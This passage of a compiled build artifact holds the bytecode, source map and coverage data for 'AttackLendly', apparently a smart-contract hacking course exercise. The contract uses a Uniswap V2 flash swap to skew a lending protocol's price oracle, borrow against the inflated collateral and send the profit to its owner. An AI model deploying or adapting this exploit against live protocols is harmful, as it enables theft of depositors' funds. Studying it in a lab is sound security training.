5060006103e8610514846004610dde565b61051e9190610e0b565b60405163a9059cbb60e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018590529192509088169063a9059cbb906044016020604051808303816000875af1158015610591573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105b59190610e2d565b5060405163a9059cbb60e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301526024820183905285169063a9059cbb906044016020604051808303816000875af1158015610625573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106499190610e2d565b506106526109f4565b505050505050505050505050565b610668610c65565b6106726000610cbf565b565b61067c610c65565b600060607f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156106de573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107029190610e84565b506001600160701b03908116600255166001819055606490610725906063610dde565b61072f9190610e0b565b604080516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001660208201529193500160408051601f198184030181529082905263022c0d9f60e01b825291506001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169063022c0d9f906107c990859060009030908790600401610f21565b600060405180830381600087803b1580156107e357600080fd5b505af11580156107f7573d6000803e3d6000fd5b505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610859573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061087d9190610e84565b506001600160701b03908116600281905591166001556064906108a1906063610dde565b6108ab9190610e0b565b604080516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001660208201529193500160408051601f198184030181529082905263022c0d9f60e01b825291506001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169063022c0d9f9061094590600090869030908790600401610f21565b600060405180830381600087803b15801561095f57600080fd5b505af1158015610973573d6000803e3d6000fd5b505050505050565b610983610c65565b6001600160a01b0381166109e85760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610112565b6109f181610cbf565b50565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663a9059cbb610a356000546001600160a01b031690565b6040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a0823190602401602060405180830381865afa158015610a99573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610abd9190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610b08573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b2c9190610e2d565b507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663a9059cbb610b6e6000546001600160a01b031690565b6040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a0823190602401602060405180830381865afa158015610bd2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bf69190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610c41573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109f19190610e2d565b6000546001600160a01b031633146106725760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610112565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6001600160a01b03811681146109f157600080fd5b600080600080600060808688031215610d3c57600080fd5b8535610d4781610d0f565b94506020860135935060408601359250606086013567ffffffffffffffff80821115610d7257600080fd5b818801915088601f830112610d8657600080fd5b813581811115610d9557600080fd5b896020828501011115610da757600080fd5b9699959850939650602001949392505050565b600060208284031215610dcc57600080fd5b8135610dd781610d0f565b9392505050565b6000816000190483118215151615610e0657634e487b7160e01b600052601160045260246000fd5b500290565b600082610e2857634e487b7160e01b600052601260045260246000fd5b500490565b600060208284031215610e3f57600080fd5b81518015158114610dd757600080fd5b600060208284031215610e6157600080fd5b5051919050565b80516001600160701b0381168114610e7f57600080fd5b919050565b600080600060608486031215610e9957600080fd5b610ea284610e68565b9250610eb060208501610e68565b9150604084015163ffffffff81168114610ec957600080fd5b809150509250925092565b6000815180845260005b81811015610efa57602081850181015186830182015201610ede565b81811115610f0c576000602083870101525b50601f01601f19169290920160200192915050565b84815283602082015260018060a01b0383166040820152608060608201526000610f4e6080830184610ed4565b969550505050505056fea2646970667358221220dff5c0fef33f3a6b4ea61ea383cbb312e30c735d3191bc43ac7f28f4c1d64b8c64736f6c634300080d0033",
  "bytecodeSha1": "c4834f5120242e6dd28aa6834c75ad85cfb3cf89",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.13+commit.abaa5c0e"
  },
  "contractName": "AttackLendly",
  "coverageMap": {
    "branches": {
      "0": {
        "Ownable._checkOwner": {
          "38": [
            1422,
            1445,
            true
          ]
        },
        "Ownable.transferOwnership": {
          "37": [
            2169,
            2191,
            true
          ]
        }
      },
      "1": {},
      "2": {},
      "3": {
        "AttackLendly.uniswapV2Call": {
          "31": [
            1977,
            2004,
            true
          ],
          "32": [
            2035,
            2058,
            true
          ],
          "33": [
            2228,
            2243,
            true
          ],
          "34": [
            2247,
            2262,
            true
          ],
          "35": [
            2306,
            2318,
            true
          ],
          "36": [
            2655,
            2670,
            false
          ]
        }
      },
      "4": {}
    },
    "statements": {
      "0": {
        "Ownable._checkOwner": {
          "28": [
            1414,
            1482
          ]
        },
        "Ownable._transferOwnership": {
          "29": [
            2541,
            2558
          ],
          "30": [
            2568,
            2613
          ]
        },
        "Ownable.owner": {
          "0": [
            1266,
            1279
          ]
        },
        "Ownable.renounceOwnership": {
          "14": [
            1895,
            1925
          ]
        },
        "Ownable.transferOwnership": {
          "23": [
            2161,
            2234
          ],
          "24": [
            2244,
            2272
          ]
        }
      },
      "1": {},
      "2": {
        "Context._msgSender": {
          "27": [
            712,
            729
          ]
        }
      },
      "3": {
        "AttackLendly.attack": {
          "15": [
            1226,
            1268
          ],
          "16": [
            1340,
            1372
          ],
          "17": [
            1382,
            1407
          ],
          "18": [
            1417,
            1462
          ],
          "19": [
            1592,
            1634
          ],
          "20": [
            1644,
            1676
          ],
          "21": [
            1686,
            1711
          ],
          "22": [
            1721,
            1766
          ]
        },
        "AttackLendly.uniswapV2Call": {
          "1": [
            1969,
            2017
          ],
          "2": [
            2027,
            2073
          ],
          "3": [
            2220,
            2278
          ],
          "4": [
            2438,
            2483
          ],
          "5": [
            2493,
            2538
          ],
          "6": [
            2719,
            2747
          ],
          "7": [
            2686,
            2705
          ],
          "8": [
            2811,
            2839
          ],
          "9": [
            2778,
            2797
          ],
          "10": [
            2898,
            2971
          ],
          "11": [
            3219,
            3268
          ],
          "12": [
            3278,
            3337
          ],
          "13": [
            3356,
            3372
          ]
        },
        "AttackLendly.withdrawProfit": {
          "25": [
            3430,
            3487
          ],
          "26": [
            3497,
            3554
          ]
        }
      },
      "4": {}
    }
  },
  "dependencies": [
    "OpenZeppelin/openzeppelin-contracts@4.8.0/Context",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/IERC20",
    "ILendly",
    "IUniswapV2Pair",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/Ownable"
  ],
  "deployedBytecode": "608060405234801561001057600080fd5b50600436106100575760003560e01c806310d1e85c1461005c578063715018a6146100715780638da5cb5b146100795780639e5faafc14610098578063f2fde38b146100a0575b600080fd5b61006f61006a366004610d24565b6100b3565b005b61006f610660565b600054604080516001600160a01b039092168252519081900360200190f35b61006f610674565b61006f6100ae366004610dba565b61097b565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461011b5760405162461bcd60e51b81526020600482015260086024820152673737ba103830b4b960c11b60448201526064015b60405180910390fd5b6001600160a01b03851630146101605760405162461bcd60e51b815260206004820152600a6024820152693737ba1039b2b73232b960b11b6044820152606401610112565b600061016e82840184610dba565b90507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316816001600160a01b031614806101e157507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316816001600160a01b0316145b61021b5760405162461bcd60e51b815260206004820152600b60248201526a3bb937b733903a37b5b2b760a91b6044820152606401610112565b60008515610229578561022b565b845b905060006103e861023d836001610dde565b6102479190610e0b565b60405163095ea7b360e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018390529192509084169063095ea7b3906044016020604051808303816000875af11580156102ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102de9190610e2d565b506040516311f9fbc960e21b81526001600160a01b038481166004830152602482018390527f000000000000000000000000000000000000000000000000000000000000000016906347e7ef2490604401600060405180830381600087803b15801561034957600080fd5b505af115801561035d573d6000803e3d6000fd5b505050506000807f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316856001600160a01b0316036103c95750506002547f0000000000000000000000000000000000000000000000000000000000000000906103f1565b50506001547f0000000000000000000000000000000000000000000000000000000000000000905b6040516370a0823160e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830181905291634b8a3529918591908216906370a0823190602401602060405180830381865afa158015610463573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104879190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401600060405180830381600087803b1580156104cd57600080fd5b505af11580156104e1573d6000803e3d6000fd5b5050505060006103e8856103e76104f89190610dde565b6105029190610e0b565b905060006103e8610514846004610dde565b61051e9190610e0b565b60405163a9059cbb60e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018590529192509088169063a9059cbb906044016020604051808303816000875af1158015610591573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105b59190610e2d565b5060405163a9059cbb60e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301526024820183905285169063a9059cbb906044016020604051808303816000875af1158015610625573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106499190610e2d565b506106526109f4565b505050505050505050505050565b610668610c65565b6106726000610cbf565b565b61067c610c65565b600060607f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156106de573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107029190610e84565b506001600160701b03908116600255166001819055606490610725906063610dde565b61072f9190610e0b565b604080516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001660208201529193500160408051601f198184030181529082905263022c0d9f60e01b825291506001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169063022c0d9f906107c990859060009030908790600401610f21565b600060405180830381600087803b1580156107e357600080fd5b505af11580156107f7573d6000803e3d6000fd5b505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610859573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061087d9190610e84565b506001600160701b03908116600281905591166001556064906108a1906063610dde565b6108ab9190610e0b565b604080516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001660208201529193500160408051601f198184030181529082905263022c0d9f60e01b825291506001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169063022c0d9f9061094590600090869030908790600401610f21565b600060405180830381600087803b15801561095f57600080fd5b505af1158015610973573d6000803e3d6000fd5b505050505050565b610983610c65565b6001600160a01b0381166109e85760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610112565b6109f181610cbf565b50565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663a9059cbb610a356000546001600160a01b031690565b6040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a0823190602401602060405180830381865afa158015610a99573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610abd9190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610b08573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b2c9190610e2d565b507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663a9059cbb610b6e6000546001600160a01b031690565b6040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a0823190602401602060405180830381865afa158015610bd2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bf69190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610c41573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109f19190610e2d565b6000546001600160a01b031633146106725760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610112565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6001600160a01b03811681146109f157600080fd5b600080600080600060808688031215610d3c57600080fd5b8535610d4781610d0f565b94506020860135935060408601359250606086013567ffffffffffffffff80821115610d7257600080fd5b818801915088601f830112610d8657600080fd5b813581811115610d9557600080fd5b896020828501011115610da757600080fd5b9699959850939650602001949392505050565b600060208284031215610dcc57600080fd5b8135610dd781610d0f565b9392505050565b6000816000190483118215151615610e0657634e487b7160e01b600052601160045260246000fd5b500290565b600082610e2857634e487b7160e01b600052601260045260246000fd5b500490565b600060208284031215610e3f57600080fd5b81518015158114610dd757600080fd5b600060208284031215610e6157600080fd5b5051919050565b80516001600160701b0381168114610e7f57600080fd5b919050565b600080600060608486031215610e9957600080fd5b610ea284610e68565b9250610eb060208501610e68565b9150604084015163ffffffff81168114610ec957600080fd5b809150509250925092565b6000815180845260005b81811015610efa57602081850181015186830182015201610ede565b81811115610f0c576000602083870101525b50601f01601f19169290920160200192915050565b84815283602082015260018060a01b0383166040820152608060608201526000610f4e6080830184610ed4565b969550505050505056fea2646970667358221220dff5c0fef33f3a6b4ea61ea383cbb312e30c735d3191bc43ac7f28f4c1d64b8c64736f6c634300080d0033",
  "deployedSourceMap": "569:2995:3:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1780:1599;;;;;;:::i;:::-;;:::i;:::-;;1831:101:0;;;:::i;1201:85::-;1247:7;1273:6;1201:85;;;-1:-1:-1;;;;;1273:6:0;;;1164:51:5;;1201:85:0;;;;;1152:2:5;1201:85:0;;;1067:707:3;;;:::i;2081:198:0:-;;;;;;:::i;:::-;;:::i;1780:1599:3:-;1977:10;-1:-1:-1;;;;;1999:4:3;1977:27;;1969:48;;;;-1:-1:-1;;;1969:48:3;;1680:2:5;1969:48:3;;;1662:21:5;1719:1;1699:18;;;1692:29;-1:-1:-1;;;1737:18:5;;;1730:38;1785:18;;1969:48:3;;;;;;;;;-1:-1:-1;;;;;2035:23:3;;2053:4;2035:23;2027:46;;;;-1:-1:-1;;;2027:46:3;;2016:2:5;2027:46:3;;;1998:21:5;2055:2;2035:18;;;2028:30;-1:-1:-1;;;2074:18:5;;;2067:40;2124:18;;2027:46:3;1814:334:5;2027:46:3;2160:12;2182:27;;;;2193:4;2182:27;:::i;:::-;2160:50;;2237:6;-1:-1:-1;;;;;2228:15:3;:5;-1:-1:-1;;;;;2228:15:3;;:34;;;;2256:6;-1:-1:-1;;;;;2247:15:3;:5;-1:-1:-1;;;;;2247:15:3;;2228:34;2220:58;;;;-1:-1:-1;;;2220:58:3;;2615:2:5;2220:58:3;;;2597:21:5;2654:2;2634:18;;;2627:30;-1:-1:-1;;;2673:18:5;;;2666:41;2724:18;;2220:58:3;2413:335:5;2220:58:3;2289:14;2306:12;;:32;;2331:7;2306:32;;;2321:7;2306:32;2289:49;-1:-1:-1;2387:21:3;2424:4;2411:10;2289:49;2420:1;2411:10;:::i;:::-;:17;;;;:::i;:::-;2438:45;;-1:-1:-1;;;2438:45:3;;-1:-1:-1;;;;;2460:6:3;3437:32:5;;2438:45:3;;;3419:51:5;3486:18;;;3479:34;;;;;-1:-1:-1;2438:13:3;;;;;;3392:18:5;;2438:45:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;2493:45:3;;-1:-1:-1;;;2493:45:3;;-1:-1:-1;;;;;3437:32:5;;;2493:45:3;;;3419:51:5;3486:18;;;3479:34;;;2493:6:3;:14;;;;3392:18:5;;2493:45:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2590:17;2617:25;2664:6;-1:-1:-1;;;;;2655:15:3;:5;-1:-1:-1;;;;;2655:15:3;;2652:198;;-1:-1:-1;;2739:8:3;;2699:6;;2652:198;;;-1:-1:-1;;2831:8:3;;2791:6;;2652:198;2933:37;;-1:-1:-1;;;2933:37:3;;-1:-1:-1;;;;;2898:6:3;:13;;2933:37;;;1164:51:5;;;2898:13:3;;;2920:10;;2933:20;;;;;;1137:18:5;;2933:37:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2898:73;;-1:-1:-1;;;;;;2898:73:3;;;;;;;-1:-1:-1;;;;;3437:32:5;;;2898:73:3;;;3419:51:5;3486:18;;;3479:34;3392:18;;2898:73:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3013:26;3057:4;3042:6;3051:3;3042:12;;;;:::i;:::-;:19;;;;:::i;:::-;3013:48;-1:-1:-1;3146:31:3;3204:4;3180:21;:17;3200:1;3180:21;:::i;:::-;:28;;;;:::i;:::-;3219:49;;-1:-1:-1;;;3219:49:3;;-1:-1:-1;;;;;3242:4:3;3437:32:5;;3219:49:3;;;3419:51:5;3486:18;;;3479:34;;;3146:62:3;;-1:-1:-1;3219:14:3;;;;;;3392:18:5;;3219:49:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;3278:59:3;;-1:-1:-1;;;3278:59:3;;-1:-1:-1;;;;;3306:4:3;3437:32:5;;3278:59:3;;;3419:51:5;3486:18;;;3479:34;;;3278:19:3;;;;;3392:18:5;;3278:59:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;3356:16;:14;:16::i;:::-;1915:1464;;;;;;;1780:1599;;;;;:::o;1831:101:0:-;1094:13;:11;:13::i;:::-;1895:30:::1;1922:1;1895:18;:30::i;:::-;1831:101::o:0;1067:707:3:-;1094:13:0;:11;:13::i;:::-;1115:18:3::1;1143:17;1250:4;-1:-1:-1::0;;;;;1250:16:3::1;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1::0;;;;;;1226:42:3;;::::1;1237:8;1226:42:::0;::::1;1227:8;1226:42:::0;;;1369:3:::1;::::0;1353:13:::1;::::0;1364:2:::1;1353:13;:::i;:::-;:19;;;;:::i;:::-;1389:18;::::0;;-1:-1:-1;;;;;1400:6:3::1;1182:32:5::0;1389:18:3::1;::::0;::::1;1164:51:5::0;1340:32:3;;-1:-1:-1;1137:18:5;1389::3::1;::::0;;-1:-1:-1;;1389:18:3;;::::1;::::0;;;;;;;-1:-1:-1;;;1417:45:3;;1389:18;-1:-1:-1;;;;;;1417:4:3::1;:9;::::0;::::1;::::0;:45:::1;::::0;1427:10;;1439:1:::1;::::0;1450:4:::1;::::0;1389:18;;1417:45:::1;;;:::i;:::-;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;1616:4;-1:-1:-1::0;;;;;1616:16:3::1;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1::0;;;;;;1592:42:3;;::::1;1603:8;1592:42:::0;;;;::::1;1593:8;1592:42:::0;1673:3:::1;::::0;1657:13:::1;::::0;1668:2:::1;1657:13;:::i;:::-;:19;;;;:::i;:::-;1693:18;::::0;;-1:-1:-1;;;;;1704:6:3::1;1182:32:5::0;1693:18:3::1;::::0;::::1;1164:51:5::0;1644:32:3;;-1:-1:-1;1137:18:5;1693::3::1;::::0;;-1:-1:-1;;1693:18:3;;::::1;::::0;;;;;;;-1:-1:-1;;;1721:45:3;;1693:18;-1:-1:-1;;;;;;1721:4:3::1;:9;::::0;::::1;::::0;:45:::1;::::0;1731:1:::1;::::0;1734:10;;1754:4:::1;::::0;1693:18;;1721:45:::1;;;:::i;:::-;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;1104:670;;1067:707::o:0;2081:198:0:-;1094:13;:11;:13::i;:::-;-1:-1:-1;;;;;2169:22:0;::::1;2161:73;;;::::0;-1:-1:-1;;;2161:73:0;;6485:2:5;2161:73:0::1;::::0;::::1;6467:21:5::0;6524:2;6504:18;;;6497:30;6563:34;6543:18;;;6536:62;-1:-1:-1;;;6614:18:5;;;6607:36;6660:19;;2161:73:0::1;6283:402:5::0;2161:73:0::1;2244:28;2263:8;2244:18;:28::i;:::-;2081:198:::0;:::o;3385:176:3:-;3430:6;-1:-1:-1;;;;;3430:15:3;;3446:7;1247::0;1273:6;-1:-1:-1;;;;;1273:6:0;;1201:85;3446:7:3;3455:31;;-1:-1:-1;;;3455:31:3;;3480:4;3455:31;;;1164:51:5;3455:6:3;-1:-1:-1;;;;;3455:16:3;;;;1137:18:5;;3455:31:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;3430:57;;-1:-1:-1;;;;;;3430:57:3;;;;;;;-1:-1:-1;;;;;3437:32:5;;;3430:57:3;;;3419:51:5;3486:18;;;3479:34;3392:18;;3430:57:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;3497:6;-1:-1:-1;;;;;3497:15:3;;3513:7;1247::0;1273:6;-1:-1:-1;;;;;1273:6:0;;1201:85;3513:7:3;3522:31;;-1:-1:-1;;;3522:31:3;;3547:4;3522:31;;;1164:51:5;3522:6:3;-1:-1:-1;;;;;3522:16:3;;;;1137:18:5;;3522:31:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;3497:57;;-1:-1:-1;;;;;;3497:57:3;;;;;;;-1:-1:-1;;;;;3437:32:5;;;3497:57:3;;;3419:51:5;3486:18;;;3479:34;3392:18;;3497:57:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;1359:130:0:-;1247:7;1273:6;-1:-1:-1;;;;;1273:6:0;719:10:2;1422:23:0;1414:68;;;;-1:-1:-1;;;1414:68:0;;6892:2:5;1414:68:0;;;6874:21:5;;;6911:18;;;6904:30;6970:34;6950:18;;;6943:62;7022:18;;1414:68:0;6690:356:5;2433:187:0;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:0;;;-1:-1:-1;;;;;;2541:17:0;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;14:131:5:-;-1:-1:-1;;;;;89:31:5;;79:42;;69:70;;135:1;132;125:12;150:863;247:6;255;263;271;279;332:3;320:9;311:7;307:23;303:33;300:53;;;349:1;346;339:12;300:53;388:9;375:23;407:31;432:5;407:31;:::i;:::-;457:5;-1:-1:-1;509:2:5;494:18;;481:32;;-1:-1:-1;560:2:5;545:18;;532:32;;-1:-1:-1;615:2:5;600:18;;587:32;638:18;668:14;;;665:34;;;695:1;692;685:12;665:34;733:6;722:9;718:22;708:32;;778:7;771:4;767:2;763:13;759:27;749:55;;800:1;797;790:12;749:55;840:2;827:16;866:2;858:6;855:14;852:34;;;882:1;879;872:12;852:34;927:7;922:2;913:6;909:2;905:15;901:24;898:37;895:57;;;948:1;945;938:12;895:57;150:863;;;;-1:-1:-1;150:863:5;;-1:-1:-1;979:2:5;971:11;;1001:6;150:863;-1:-1:-1;;;150:863:5:o;1226:247::-;1285:6;1338:2;1326:9;1317:7;1313:23;1309:32;1306:52;;;1354:1;1351;1344:12;1306:52;1393:9;1380:23;1412:31;1437:5;1412:31;:::i;:::-;1462:5;1226:247;-1:-1:-1;;;1226:247:5:o;2753:265::-;2793:7;2859:1;2855;2851:6;2847:14;2844:1;2841:21;2836:1;2829:9;2822:17;2818:45;2815:168;;;2905:10;2900:3;2896:20;2893:1;2886:31;2940:4;2937:1;2930:15;2968:4;2965:1;2958:15;2815:168;-1:-1:-1;3003:9:5;;2753:265::o;3023:217::-;3063:1;3089;3079:132;;3133:10;3128:3;3124:20;3121:1;3114:31;3168:4;3165:1;3158:15;3196:4;3193:1;3186:15;3079:132;-1:-1:-1;3225:9:5;;3023:217::o;3524:277::-;3591:6;3644:2;3632:9;3623:7;3619:23;3615:32;3612:52;;;3660:1;3657;3650:12;3612:52;3692:9;3686:16;3745:5;3738:13;3731:21;3724:5;3721:32;3711:60;;3767:1;3764;3757:12;3806:184;3876:6;3929:2;3917:9;3908:7;3904:23;3900:32;3897:52;;;3945:1;3942;3935:12;3897:52;-1:-1:-1;3968:16:5;;3806:184;-1:-1:-1;3806:184:5:o;3995:188::-;4074:13;;-1:-1:-1;;;;;4116:42:5;;4106:53;;4096:81;;4173:1;4170;4163:12;4096:81;3995:188;;;:::o;4188:450::-;4275:6;4283;4291;4344:2;4332:9;4323:7;4319:23;4315:32;4312:52;;;4360:1;4357;4350:12;4312:52;4383:40;4413:9;4383:40;:::i;:::-;4373:50;;4442:49;4487:2;4476:9;4472:18;4442:49;:::i;:::-;4432:59;;4534:2;4523:9;4519:18;4513:25;4578:10;4571:5;4567:22;4560:5;4557:33;4547:61;;4604:1;4601;4594:12;4547:61;4627:5;4617:15;;;4188:450;;;;;:::o;4865:471::-;4906:3;4944:5;4938:12;4971:6;4966:3;4959:19;4996:1;5006:162;5020:6;5017:1;5014:13;5006:162;;;5082:4;5138:13;;;5134:22;;5128:29;5110:11;;;5106:20;;5099:59;5035:12;5006:162;;;5186:6;5183:1;5180:13;5177:87;;;5252:1;5245:4;5236:6;5231:3;5227:16;5223:27;5216:38;5177:87;-1:-1:-1;5318:2:5;5297:15;-1:-1:-1;;5293:29:5;5284:39;;;;5325:4;5280:50;;4865:471;-1:-1:-1;;4865:471:5:o;5341:466::-;5580:6;5569:9;5562:25;5623:6;5618:2;5607:9;5603:18;5596:34;5695:1;5691;5686:3;5682:11;5678:19;5670:6;5666:32;5661:2;5650:9;5646:18;5639:60;5735:3;5730:2;5719:9;5715:18;5708:31;5543:4;5756:45;5796:3;5785:9;5781:19;5773:6;5756:45;:::i;:::-;5748:53;5341:466;-1:-1:-1;;;;;;5341:466:5:o",
  "language": "Solidity",
  "natspec": {
    "author": "JohnnyTime (https://smartcontractshacking.com)",
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "title": "AttackLendly",
    "version": 1
  },
  "offset": [
    569,
    3564
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x10D1E85C EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x79 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x98 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0xA0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6F PUSH2 0x6A CALLDATASIZE PUSH1 0x4 PUSH2 0xD24 JUMP JUMPDEST PUSH2 0xB3 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6F PUSH2 0x660 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x6F PUSH2 0x674 JUMP JUMPDEST PUSH2 0x6F PUSH2 0xAE CALLDATASIZE PUSH1 0x4 PUSH2 0xDBA JUMP JUMPDEST PUSH2 0x97B JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x11B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x8 PUSH1 0x24 DUP3 ADD MSTORE PUSH8 0x3737BA103830B4B9 PUSH1 0xC1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT 